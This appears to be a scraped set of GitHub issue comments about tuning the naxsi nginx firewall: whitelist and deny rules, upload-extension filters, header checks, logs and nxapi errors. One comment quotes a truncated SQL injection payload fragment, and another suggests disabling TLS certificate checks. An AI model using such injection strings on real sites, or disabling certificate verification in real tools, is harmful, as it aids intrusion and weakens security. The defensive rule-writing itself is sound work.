    "mickaelmonsieur": "Ok thanks \ud83d\udc4d \nWith error.log i have : Written 1481401 events.\nIn the documentation, It is not specified to use error.log, but \"/PATH/TO/LOGFILE.LOG\" :-). Sorry, i have another problem:\nroot@waf002:/opt/naxsi/nxapi# ./nxtool.py -c nxapi.json -x\nsize :1000\nWhitelist(ing) ratio :\nNo handlers could be found for logger \"elasticsearch\"\nTraceback (most recent call last):\n  File \"./nxtool.py\", line 274, in <module>\n    translate.fetch_top(cfg.cfg[\"global_filters\"], \"whitelisted\", limit=2)\n  File \"/opt/naxsi/nxapi/nxapi/nxtransform.py\", line 550, in fetch_top\n    res = self.search(esq)\n  File \"/opt/naxsi/nxapi/nxapi/nxtransform.py\", line 619, in search\n    x = self.es.search(index=self.cfg[\"elastic\"][\"index\"], doc_type=self.cfg[\"elastic\"][\"doctype\"], body=esq)\n  File \"/usr/lib/python2.7/dist-packages/elasticsearch/client/utils.py\", line 68, in _wrapped\n    return func(*args, params=params, **kwargs)\n  File \"/usr/lib/python2.7/dist-packages/elasticsearch/client/__init__.py\", line 440, in search\n    params=params, body=body)\n  File \"/usr/lib/python2.7/dist-packages/elasticsearch/transport.py\", line 284, in perform_request\n    status, headers, data = connection.perform_request(method, url, params, body, ignore=ignore, timeout=timeout)\n  File \"/usr/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py\", line 55, in perform_request\n    self._raise_error(response.status, raw_data)\n  File \"/usr/lib/python2.7/dist-packages/elasticsearch/connection/base.py\", line 97, in _raise_error\n    raise HTTP_EXCEPTIONS.get(status_code, TransportError)(status_code, error_message, additional_info)\nelasticsearch.exceptions.RequestError: TransportError(400, {u'failed_shards': [{u'node': u'JewSL91LT5-oK9fBkYisuA', u'index': u'nxapi', u'reason': {u'reason': u'Fielddata is disabled on text fields by default. Set fielddata=true on [whitelisted] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory.', u'type': u'illegal_argument_exception'}, u'shard': 0}], u'root_cause': [{u'reason': u'Fielddata is disabled on text fields by default. Set fielddata=true on [whitelisted] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory.', u'type': u'illegal_argument_exception'}], u'caused_by': {u'reason': u'Fielddata is disabled on text fields by default. Set fielddata=true on [whitelisted] in order to load fielddata in memory by uninverting the inverted index. Note that this can however use significant memory.', u'type': u'illegal_argument_exception'}, u'grouped': True, u'reason': u'all shards failed', u'phase': u'query', u'type': u'search_phase_execution_exception'})\nroot@waf002:/opt/naxsi/nxapi#. Hi,\nThe latest version stable:\nroot@waf002:/home/mickael# dpkg-query -l | grep elastic\nii  elasticsearch                  5.0.2                       all          Elasticsearch is a distributed RESTful search engine built for the cloud. Reference documentation can be found at https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html and the 'Elasticsearch: The Definitive Guide' book can be found at https://www.elastic.co/guide/en/elasticsearch/guide/current/index.html\nii  python-elasticsearch           1.2.0-1                     all          Python client for Elasticsearch\nroot@waf002:/home/mickael# cat /etc/debian_version \n8.6. ",
    "C0nw0nk": "Ok so I figured it out and got it working via a whitelist only principle :) <3\nHere is my rule that works if anyone sees a problem please do say.\nBe sure to either remove or to Null out by inserting a # tag infront of rule id:1500\n```\n\nFile uploads: 1500-1600\n\nMainRule \"rx:.ph|.asp|.ht\" \"msg:asp/php file upload\" \"mz:FILE_EXT\" \"s:$UPLOAD:8\" id:1500;\nMainRule \"rx:.(?!jpeg|jpg|mov|mpeg|png|divx|flv|mpg|avi|mp4|webm|wmv|ogg|m4v|mkv)$\" \"msg:Block all file uploads except those whitelisted\" \"mz:FILE_EXT\" \"s:$UPLOAD:8\" id:1501;\n```\nTested uploading all sorts of files other than those file types defined in that list it and it blocks them all successfully. \ud83d\udc4d \nThere does seem to be multiple ways to write the rule like the regex above but also will work like this.\nMainRule negative \"rx:\\.jpeg$|\\.jpg$|\\.mov$|\\.mpeg$|\\.png$|\\.divx$|\\.flv$|\\.mpg$|\\.avi$|\\.mp4$|\\.webm$|\\.wmv$|\\.ogg$|\\.m4v$|\\.mkv$\" \"msg:Block all file uploads except those whitelisted\" \"mz:FILE_EXT\" \"s:$UPLOAD:8\" id:1501;. Yes I am. But I am using the second rule I provided now since after looking at the Wiki it seems I should be using \"negative\" instead of \"?!\" or does that not matter, Both methods I found are efficient ?\nThe rule now to avoid potential bypassing.\nMainRule negative \"rx:\\.jpeg$|\\.jpg$|\\.mov$|\\.mpeg$|\\.png$|\\.divx$|\\.flv$|\\.mpg$|\\.avi$|\\.mp4$|\\.webm$|\\.wmv$|\\.ogg$|\\.m4v$|\\.mkv$\" \"msg:Block all file uploads except those whitelisted\" \"mz:FILE_EXT\" \"s:$UPLOAD:8\" id:1501;\nUpdated my original comment above for the rule to be identical to this.. As i demonstrated here https://github.com/nbs-system/naxsi/issues/335#issuecomment-267972230\nYou can do so using the value \"negative\".\nMainRule negative \"str:x-forwarded-for\"  \"msg:head\" \"mz:HEADERS\" \"s:$TE:1\" id:17000;\nWhat would be if not contains x-forwarded-for in headers.\nor you can use negative value in regex example (!?stringhere)\nMainRule \"rx:(!?x-forwarded-for)\"  \"msg:head\" \"mz:HEADERS\" \"s:$TE:1\" id:17000;. If you look here at the types of MySQL exploits found in web apps.\nhttps://www.exploit-db.com/webapps/\nExample :\nsql\n(select+1+from+(select+count(*),+concat((select+(select+concat(\nI think there is allot of variations of methods they can use to try and bypass it spacing between words etc.\nI also think its a rule that would need testing for the best outcome as a core rule before being changed.\nAs the original rule currently sits it is blocking very well and users can insert this. BasicRule wl:1000; #Disable rule to disable it on locations / areas of their sites they do not require it.\nI am also curious about this rule with libsql enabled.\nLibInjectionSql;\nCheckRule \"$LIBINJECTION_SQL >= 8\" BLOCK;\nIts not necessary for those who enable libsql?. Yea but if I do that it blocks URL's in this format working\n/url/\n/url.html?stuff&morestuff=etc\n/url.php?stuff&morestuff=extrastuff&stuffing\nIn a nutshell I just want to prevent URL probing of links / formats that are invalid or don't exist.. In the regex $ is for the end so anything that comes after that should be blocked right ?\nMainRule negative \"rx:\\.(html|php)$\" \"msg:Block access to any URL format other than those whitelisted\" \"mz:URL\" \"s:$UWA:8\" id:1600;\nSo a URL that ends with query strings or arguments will be accepted or blocked ?, To me it looks like those URL's with arguments will be blocked since there is noting in the regex to accept those formats.\nAnd then ofcourse URL's that are search engine friendly\n```\n/url/\n/url\n/url#div-id-number\n/url&stuff=stuffed&stuffing=stuffs. I see now that makes sense. In that case the only problem that could remain is URL's that have no format being search engine friendly how do I include these types into that regex.\n/url/url\n/url/url/\n/url/\n/url\n/. Thanks :D wouldn't that be a separate rule how do I combine both of them into a single rule ? <3\nMainRule negative \"rx:\\.(html|php)$\" \"msg:Block access to any URL format other than those whitelisted\" \"mz:URL\" \"s:$UWA:8\" id:1600;\nMainRule negative \"rx:^/[a-zA-Z0-9/]+/$\" \"msg:Block access to any URL format other than those whitelisted\" \"mz:URL\" \"s:$UWA:8\" id:1600;\nI am still learning but this place helps allot. http://spike.nginx-goodies.com/rules/. A fantastic example I can think of is PHP Object Injection execution (remote code) in a User-Agent HEAD request that Naxsi would not detect and would be game over for PHP back end processes.\nThe same applies for other request methods that have the potential to bypass Naxsi on locations. https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods\nLooking forward to some input about this issue.. That's ok I don't have any requirement for any other request types other than GET and POST but perhaps other people do.. They all say request: \"POST\nThey all say BODY&id0=16\nAnd rule ID 16 is a empty post request #@MainRule \"msg:empty POST\" id:16;\nhttps://github.com/nbs-system/naxsi/blob/master/naxsi_config/naxsi_core.rules#L12\nSo someone is making empty POST requests on those pages and Naxsi is blocking them as intended via that rule.\nIf you want to allow Empty / Blank POST requests then add this to your config.\nBasicRule wl:16;\nAnd if you want to turn of Naxsi then null out SecRulesEnabled; It is logging stuff because it is still enabled.. Just read your log and look at the ID number it says in the log.\nYour logs say ARGS&id0=1310 That means its rule number 1310 what is this rule.\nhttps://github.com/nbs-system/naxsi/blob/master/naxsi_config/naxsi_core.rules#L68\nIf you don't want that rule to block requests on that location then make your whitelist rule this\nBasicRule wl:1310;\nIt is straight forward when you understand what your log is telling you. As soon as you understand and learn to read your logs you are golden.. That was already done and in place but there are many IP's it may aswell be thousands of IP's shell shock probing but they are not probing for SQL exploits or anything to hack the server with. They are just intentionally bypassing the caches to DoS the server down. (Slowloris like)\n```nginx\nhttp {\nlimit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;\nlimit_conn_zone $binary_remote_addr zone=addr:10m;\nserver {\nlocation / {\nlimit_req zone=one burst=5;\nlimit_conn addr 1;\n}\n}\n}\n```\nIt is why some naxsi rules to prevent these fake and junk data requests would be useful.\nAs you see from the User-Agent I provided that is a obviously spoofed one that Naxsi could use a rule to detect spoofed / faked user agents that are too short or all numbers etc.. It also appears extensions on browsers like this do not help situations either.\nhttps://addons.mozilla.org/en-GB/firefox/addon/random-agent-spoofer/?src=cb-dl-users\n\n\nInserting fake data into urls and spoofing headers etc.\nI am not seeking to block spoofed headers that could be a real valid header or URL but when i receive requests like this that blatantly obviously garbage data and spoofed. These should be stopped.\nBlatantly obvious a problematic request with intentions to bypass caches etc.\nUser-Agent : 12345\nURL : /inDeX.php?Random=FAKEData&vars=123&vars2=456&etc=more-fake_garbage. Thanks but wouldn't a rule like that be blocking any user-agent that contains numbers like for example a valid legit user-agent is as follows.\nMozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\nIt needs to be a strict match for numbers or exact matching only i feel.\nAs for query strings thats just a nightmare really.\n```\n?rnd\n?ran\n?rand\n?random\n?1\n?2\n?3\n?4\n?abc\n?efg\netc\netc\n```. It is already a cat and mouse game :( \nDo you know if javascript challenge pages like this, The same as Cloudflare's Anti DDoS | IUAM (I'm Under Attack Mode) javascript challenge page coincidently. If these pages can allow search engine crawlers through I don't know how well Google, Bing, Baidu, DuckDuckGo etc these search engine crawlers and bots may not understand or solve javascript challenges ?. Yeah i would never whitelist the user-agent since it is easy for them to spoof and fake that.\nThe IP's I have no idea if there is a existing list anyone can share or is aware of that lists all legitimate search engines crawlers IPs to whitelist.. Well if the IPv4 or IPv6 addresses provided in the header contain the characters what makes them a valid IP.\nI know they use characters from A-Z 0-9 . : and , to separate for multiple IP's.\nBut maybe like md5 checks with php regex\nfunction isValidMd5($md5 ='')\n{\nreturn preg_match('/^[a-f0-9]{32}$/', $md5);\n}\necho isValidMd5('5d41402abc4b2a76b9719d911017c592');\nIPv6 addresses can be more strict with the regex to check if certain parts should have a character length etc I don't know the algorithm for how the addresses should be calculated though maybe someone can shed light onto such things.\nIpv4 \n192 . 168 . 0 . 1 4 parts total each part containing 0-3 chars each char can be from 0-9 each separator for the 4 parts is a full stop.. I do not want to validate it as such but just check that the characters and the order of things look correct and for it to work for both ipv4 and ipv6 just to ensure that header stays clean from anything nasty like.\nX-Forwarded-For: I-am-not-containing anything to do with-ipv4-or-ipv6 just another malicious request\nAs you can see that is not a ip address in the header at all.. ",
    "hahahaha0o1": "thank you. I want to detect a header name \"myhead\" in headers, if \"myhead\" not  is shown ,  to drop this packet\nhere is what I am try,  ie \"myhead\" is an user-deine header\n\nMainRule negative \"rx:myhead\" \"msg:myhead \" \"mz:HEADERS\" \"s:$UWA:8\" id:19001;\nCheckRule \"$UWA >= 8\" BLOCK;\n\nI put  it in the /tmp/naxsi_ut/nginx.conf\nwhen try \nwith myhead\n\ncurl http://127.0.0.1:4242/ -H \"myhead: blabla\"\n\nand\nwithout myhead\n\ncurl http://127.0.0.1:4242/ \n\nit got\n\n[error] 26185#0: 1 NAXSI_FMT: ip=127.0.0.1&server=127.0.0.1&uri=/&learning=0&vers=0.55&total_processed=1&total_blocked=1&block=1&cscore0=$UWA&score0=8&zone0=HEADERS&id0=19001&var_name0=user-agent, client: 127.0.0.1, server: localhost, request: \"GET / HTTP/1.1\", host: \"127.0.0.1:4242\"\n[error] 26185#0: 2 NAXSI_FMT: ip=127.0.0.1&server=127.0.0.1&uri=/&learning=0&vers=0.55&total_processed=2&total_blocked=2&block=1&cscore0=$UWA&score0=8&zone0=HEADERS&id0=19001&var_name0=user-agent, client: 127.0.0.1, server: localhost, request: \"GET / HTTP/1.1\", host: \"127.0.0.1:4242\"\n\nit seems it check user-agent and found there is no \"myhead\" in it ,then block it;\n\nthen append  \"|NAME\" to zone, it got the same ,both blocked.\n\nMainRule negative \"rx:myhead\" \"msg:myhead \" \"mz:HEADERS|NAME\" \"s:$UWA:8\" id:19001;\n\n\nthen try specify  \"myhead\" zone , got confused \n\nMainRule negative \"rx:myhead\" \"msg:myhead \" \"mz:$HEADERS_VAR:myhead|NAME\" \"s:$UWA:8\" id:19001;\n\nwith \"myhead\" request, expected to pass, it got error,\n without \"myhead\" request, expct to drop, it got pass.\nalso tried\n\nMainRule  \"rx:(!?myhead)\" \"msg:myhead \" \"mz:$HEADERS_VAR:myhead|NAME\" \"s:$UWA:8\" id:19001;\n\nsame confused like above\nhope for help sincerely!. what's the problem ?is there anyone knowing how to avoid this ?. ",
    "madhur": ":+1: . ",
    "CogumelosMaravilha": "sectx.com.error_log:2017/02/22 11:53:02 [error] 6144#6144: 18376 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=5&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3038800002685218114-201702-ee020b4026&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:54:01 [error] 27763#27763: 809 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=4&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3020100002935782524-201702-7423235cf9&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:54:08 [error] 27762#27762: 929 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=5&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3038800002685231055-201702-e20c99c986&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:54:23 [error] 27760#27760: 1199 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=4&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3005100003104703530-201702-e2be956bb8&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:54:53 [error] 27763#27763: 1707 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=9&total_blocked=2&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3030300002852041270-201702-e079630196&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:56:10 [error] 27758#27758: 3110 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=6&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3020100002935819029-201702-4971beb093&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:56:42 [error] 27752#27752: 3696 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=7&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3030300002852060544-201702-5cfc0bcc93&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:57:10 [error] 27755#27755: 4214 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=5&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3030300002852068642-201702-042c6edb89&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:58:15 [error] 27752#27752: 5389 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=10&total_blocked=2&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3038800002685283654-201702-7c0a7fb57b&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 11:59:21 [error] 27760#27760: 6656 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=22&total_blocked=2&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3030300002852095806-201702-f80f37d9c0&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\"\nsectx.com.error_log:2017/02/22 12:00:58 [error] 27764#27764: *8524 NAXSI_FMT: ip=10.0.100.208&server=www.sectx.com&uri=/bg.php&learning=0&vers=0.55&total_processed=21&total_blocked=1&block=1&zone0=BODY&id0=16&var_name0=, client: 10.0.100.208, server: sectx.com, request: \"POST /bg.php?numid=3005100003104789096-201702-300bb93170&idcallback=3a61e98c09ca08f45306e98eec78342b HTTP/1.1\", host: \"www.sectx.com\". Thanks.. Hi,\nAnd what about these gets what can I do:\ndefcon.com.error_log:2017/02/23 11:03:12 [error] 30989#30989: 1645870 NAXSI_FMT: ip=10.200.23.54&server=www.defcon.com&uri=/bg.php&learning=0&vers=0.55&total_processed=1485&total_blocked=0&block=0&cscore0=$XSS&score0=8&zone0=ARGS&id0=1310&var_name0=numID&zone1=ARGS&id1=1311&var_name1=numID, client: 10.200.23.54, server: defcon.com, request: \"GET /bg.php?numID=%7B[numID]%7D&idcallback=389ed07056337c5299fe188fdc96249c&event=1 HTTP/1.1\", host: \"www.defcon.com\"\ndefcon.com.error_log:2017/02/23 11:11:08 [error] 30993#30993: 1655467 NAXSI_FMT: ip=10.200.23.54&server=www.defcon.com&uri=/bg.php&learning=0&vers=0.55&total_processed=9344&total_blocked=0&block=0&cscore0=$XSS&score0=8&zone0=ARGS&id0=1310&var_name0=numID&zone1=ARGS&id1=1311&var_name1=numID, client: 10.200.23.54, server: defcon.com, request: \"GET /bg.php?numID=%7B[numID]%7D&idcallback=389ed07056337c5299fe188fdc96249c&event=1 HTTP/1.1\", host: \"www.defcon.com\"\ndefcon.com.error_log:2017/02/23 11:22:52 [error] 30990#30990: 1669044 NAXSI_FMT: ip=10.200.23.54&server=www.defcon.com&uri=/bg.php&learning=0&vers=0.55&total_processed=3101&total_blocked=0&block=0&cscore0=$XSS&score0=8&zone0=ARGS&id0=1310&var_name0=numID&zone1=ARGS&id1=1311&var_name1=numID, client: 10.200.23.54, server: defcon.com, request: \"GET /bg.php?numID=%7B[numID]%7D&idcallback=090105cb44ccfad719a35c45872b82cd%EF%BB%BF&event=1 HTTP/1.1\", host: \"www.defcon.com\"\ndefcon.com.error_log:2017/02/23 11:22:53 [error] 30991#30991: 1669067 NAXSI_FMT: ip=10.200.23.54&server=www.defcon.com&uri=/bg.php&learning=0&vers=0.55&total_processed=3389&total_blocked=0&block=0&cscore0=$XSS&score0=8&zone0=ARGS&id0=1310&var_name0=numID&zone1=ARGS&id1=1311&var_name1=numID, client: 10.200.23.54, server: defcon.com, request: \"GET /bg.php?numID=%7B[numID]%7D&idcallback=090105cb44ccfad719a35c45872b82cd%EF%BB%BF&event=1 HTTP/1.1\", host: \"www.defcon.com\"\nThanks in advance. Something like:\nBasicRule wl:16;\nto not block these lines.. Fantastic explanation. Thanks a lot.\nProblem solved (for now!).. Hi,\nIn my website I need this configuration:\nSecRulesEnabled;\nDeniedUrl \"/RequestDenied\";\nCheck & Blocking Rules\nBasicRule wl:16;\nBasicRule wl:1310;\nBasicRule wl:1311;\nCheckRule \"$SQL >= 8\" BLOCK;\nCheckRule \"$RFI >= 8\" BLOCK;\nCheckRule \"$TRAVERSAL >= 4\" BLOCK;\nCheckRule \"$EVADE >= 4\" BLOCK;\nCheckRule \"$XSS >= 8\" BLOCK;\nBut the web developers are always made changes to the code. I'm using kibana but if I get spikes I'm losing sales!. ",
    "ubuntutest": "How i can block automatic upgrade of nginx from apt?. ",
    "Onyx808": "@buixor thank you! I gave it a try but it didn't generate any rules on my test site, any ideas why?\nPlease see--> https://github.com/nbs-system/nxtool-ng/issues/22. @buixor great! is there documentation about it? . ",
    "mosidze": "dont use it, it's not mandatory.\n. ",
    "kacofoboj": "@mosidze How???\npython\nroot@root:/tmp/naxsi-0.55.3/nxapi# ./nxtool.py -c nxapi.json\nTraceback (most recent call last):\n  File \"./nxtool.py\", line 6, in <module>\n    import elasticsearch\nImportError: No module named elasticsearch\nroot@root:/tmp/naxsi-0.55.3/nxapi# ./nxtool.py -x --colors -c nxapi.json\nTraceback (most recent call last):\n  File \"./nxtool.py\", line 6, in <module>\n    import elasticsearch\nImportError: No module named elasticsearch. ",
    "snottycrustacean": "You should use $URL_X:regexp\n. ",
    "lsqworld": "I feel so sorry for wasted your time! @buixor . ",
    "nadzree": "Issue solve after upgrading nginx and naxsi. Noted on the invalid. Figured out that I can add the pattern in the based rule to suit my case. Hi buixor, understant it now. Thank you for further explaination \ud83d\udc4d . From my understanding that the error log using ngx_log_error and by reading on the lxr, the 377580 http://lxr.nginx.org/source/src/core/ngx_log.c?v=nginx-1.12.0 line 0123 it may refer to the process ID. If this could help..my parser regex looks like this:\n/\\d{4}.\\d{2}.\\d{2}\\s\\d{2}\\:\\d{2}\\:\\d{2}.NAXSI_FMT/. I see..great tips! or I can always declare a new line for the '|'..\nhowever I'm in the midst of developing a control panel to generate this rules and optimised the rules..\nAre you in plan to address this limitation in the future?. noted on this sabban.. I'll try to do a work around on the regex verification in the panel..for now we will also restrict '|'\nThank you for your prompt reply. Another problem that I noticed that BODY_VAR cant have a symbol [] \nBasicRule wl:1310,1311 \"mz:$BODY_VAR:code[]|$URL_X:^\\/pl82\\/pl182(.*)\";\nIve received an error:\nnginx: [emerg] WhiteList Hash building failed in /etc/nginx/nginx.conf:47\nnginx: configuration file /etc/nginx/nginx.conf test failed\nHowever with this rules i did not receive any error\nBasicRule wl:1310,1311 \"mz:$BODY_VAR:code[]|$URL:/pl82/pl82_bt_edit_events.php|NAME\";\nis there any other rules of combination or guide that we can follow?. Learn something today!\nThank you sabban..you are very helpfull : ). ",
    "vel21ripn": "Checking several conditions does not give you any new features, but allows you to write more readable rules.. ",
    "chepurko": "I would AND it with a URL zone, but the problem is infinite scrolling works on the homepage as well as all other places with the blogroll. So I believe the URL zone doesn't do me any good here.\nI also thought I'd be able to just match the URL /?infinity=scrolling as this is the request showing up in the NAXSI logs:\n2017/05/27 15:53:12 [error] 198#198: *17497 NAXSI_FMT: ... request:  \"POST /?infinity=scrolling HTTP/1.1\"...\nBut obviously the URL zone is for everything before the question mark.. ",
    "Loammy": "No problem...\nI already did the process of creating some whitelist rules and tagged them following documentation found here: https://github.com/nbs-system/naxsi/tree/master/nxapi...\n\nWhen I run \"./nxtool.py -c nxapi.json  -x\" I can't see the ratio between tagged/untagged events, in my lab always return a empty value, how you can see below:\n\n. Yes, I already have events that are whitelisted, in other words, I have events in elasticsearch that are with whitelisted true and others events that are with false. See below:\n\n\nIn the wiki I saw it\n\nand I don't know why in my lab I don't see this information (relation of events with whitelisted true and false)... My point is only it... I think now I explained better... I hope ;D \n. \n\nNaxsi and nxapi I got from this command (is the master version?):\ngit clone https://github.com/nbs-system/naxsi\n\nPlease, if possible send me the versions that I'll create another lab.\ntks\n. hmmm... Could you please send me your nxtool.py file? Or check line 278?\n\nIn the line 278 is the only reference of whitelisted that I found in the nxtool.py file.... ",
    "jreisinger": "I am having the same issue. Elasticsearch: 5.4.3, nginx: 1.11.8.. ",
    "sabban": "This is corrected by now.. done\n. 4868#4868 are respectively pid and tid.\n377850 is a global connection counter as stated in https://github.com/Fleshgrinder/nginx-configuration/wiki/Log-Formatting. The regexes are correct, but because of some limitation on naxsi processing, the branching \"|\" character isn't allowed.\nMaybe you can use sth like ^/pl1?8[23]/pl1?8[23](.*) instead ?. Yes, but not in the near future... To solve the problem the rule syntax has to be revamped.... You can't mixup matchzone with _X and $URL in one rule. \nhttps://github.com/nbs-system/naxsi/wiki/matchzones-bnf#regex-vs-string\nThis is an other limitation, which may be lifted one day.... Hi,\nYou should whitelist the 1016 id.\nBasicRule wl:1016 \"mz:$HEADERS_VAR:cookie\";\nRegards,. Hi,\nNot completely sure about that, but I think id 0 just does'nt exist.\nBy the way the documentation specifies that internal rule ie id under 1000 should not be whitelisted.\nhttps://github.com/nbs-system/naxsi/wiki/internal-rules\nRegards,. Hi, \nIt's a great idea to use authentication against ES.\nBut I am not confident with providing security software that doesn't check ssl certificates. \nCan you provide a patch that could make it optional (check the validity by default, and if the option is provided, bypass the check) ? \nAnd if I have the time I will update the \"new tool\" https://github.com/nbs-system/nxtool-ng/blob/master/nxtool/log_providers/elastic.py the exact same way.\nThanks.. The NAXSI_FMT reports an id0=13 which means that the POST format is invalid. \nHaven't you tried to build a POST request with the GET format ?. You are always able to use a properly formatted POST request. Whitelisting the id=13, is a bad idea.. Unless a script is provided, and proves itself useful this PR will be closed.. Did you mean something like that ?. This is the case in my proposal, or am I missing something ?\nThe only quirk is if the request is blockcked and dropped, it will be seen as blocked as it is evaluated first.... Why ? There's no drop in the configuration.... ok, then. It makes sense.\nb94415f fixes this.. ",
    "shel3over": "short solution: try first to limit the request rate by IP, and you can do that using ngx_http_limit_req_module. ",
    "f2ex": "@buixor thanks for the reply \uff1a\uff09\nnew nginx.conf\nserver {\nlisten 80 default;\naccess_log /data/wwwlogs/access_nginx.log combined;\nroot /data/wwwroot/default;\nindex index.html index.htm index.php;\nlocation ~ [^/]\\.php(/|$) {\n    #fastcgi_pass remote_php_ip:9000;   \n    SecRulesEnabled;\n    #LearningMode;     \n    DeniedUrl \"/RequestDenied\";\n    CheckRule \"$SQL >= 8\" BLOCK;\n    CheckRule \"$RFI >= 8\" BLOCK;\n    CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n    CheckRule \"$EVADE >= 4\" BLOCK;\n    CheckRule \"$XSS >= 8\" BLOCK;    \n    error_log /data/wwwlogs/foo.log;            \n    fastcgi_pass unix:/dev/shm/php-cgi.sock;\n    fastcgi_index index.php;\n    include fastcgi.conf;\n    }\nlocation /RequestDenied {\n    return 418;\n}    \nlocation ~ .*\\.(gif|jpg|jpeg|png|bmp|swf|flv|ico)$ {\n    expires 30d;\n    access_log off;\n    }\nlocation ~ .*\\.(js|css)?$ {\n    expires 7d;\n    access_log off;\n    }\n}\n\nnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok\nnginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful\n\nservice nginx restart\nnot block \nfoo.log is  empty .. @buixor I think I found the problem , there was a little mistake , now solved .\nThanks :P . @kpirnie  The problem is here :\nlocation /RequestDenied {\n    return 418;\n} \nHTTP Status Code 418 is not supported .\nChange into :\nlocation /RequestDenied {\n    return 403;  #Or a supported status code\n}\n. @craiglawson thank you very much :). ",
    "albertvaka": "I can see from the source code [1], that indeed built-in rules are always blocking.\nIs there any way that this can be overridden?\n[1] https://github.com/nbs-system/naxsi/blob/master/naxsi_src/naxsi_runtime.c#L42. ",
    "maxidea-com": "Any update for this issue? Same problem found on my production after use X-Pack security in Kibana & ElasticSearch.  I believe a update for support elastic's username & password setup in nxapi.json is necessary.. I try to modify nxtool.py like this: (user & pass setup at nxapi.json already)\nes = elasticsearch.Elasticsearch(cfg.cfg[\"elastic\"][\"host\"],\n    http_auth=(cfg.cfg[\"elastic\"][\"user\"],cfg.cfg[\"elastic\"][\"pass\"]),\n    verify_certs=False,\n    use_ssl=use_ssl)\nit was work!. ",
    "jeanpaul1977": "Hi!\nThanks for your input on this issue. I have now implemented a workaround wwith multiple serverblocks to apply the different rulesets.\nThis works as expected.\nBR,\nJP. ",
    "chancarlo": "I found the error. The quotation symbol \u201c in CheckRule \u201c$SQL >= 8\u201d BLOCK; was copied from my Excel sheet and apparently it is a different character from the the regular \" that is required. You can see how the Excel \u201c is a little bit slanted hence is interpreted by Naxsi as a different character. See side by side:\n\" \u201c. Ah so that's what flat files meant. Thanks this is great!. ",
    "rmdashrfslash": "hi Sabban, shouldn't wl:0 whitelist all rules? \nThanks. ",
    "stephanelange": "Hi,\nJust need to replace all \"2\", \"5\" by \"2\", \"5\", \"6\" in the nxtransform.py file\nES 5 and 6 seems to have a good backward compatibility\nIt has worked fine for me, no troubles by now. ",
